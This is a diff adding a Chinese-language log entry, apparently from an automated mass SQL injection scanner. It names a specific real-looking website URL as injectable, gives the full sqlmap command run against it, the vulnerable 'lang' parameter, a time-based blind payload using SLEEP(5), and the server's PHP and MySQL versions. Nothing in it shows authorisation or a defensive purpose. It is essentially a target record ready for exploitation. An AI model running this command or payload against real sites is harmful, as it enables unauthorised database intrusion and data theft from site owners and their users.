@@ -1,0 +1,15 @@
+发现时间 : 2018-12-03:18:19:30
+网站标题 : 首页-YY官网|叶云官网
+注入网址 : http://www.yy1990.com/strength/product.php?lang=cn&class2=240
+执行命令 : F:\CODE\Langzi_Api\GET_SQL\lib\python.exe F:\CODE\Langzi_Api\GET_SQL\lib\sqlmap\sqlmap.py -u http://www.yy1990.com/strength/product.php?lang=cn^&class2=240 --batch --thread=10 --random-agent
+
+注入参数(方式) : lang (GET)
+    注入方式 : AND/OR time-based blind
+    注入标题 : MySQL >= 5.0.12 AND time-based blind
+    注入攻击 : lang=cn' AND SLEEP(5) AND 'RBzj'='RBzj&class2=233
+
+数据库类型 : MySQL
+服务器语言 : Apache, PHP 5.3.27
+数据库版本 : MySQL >= 5.0.12
+
+---------------------------
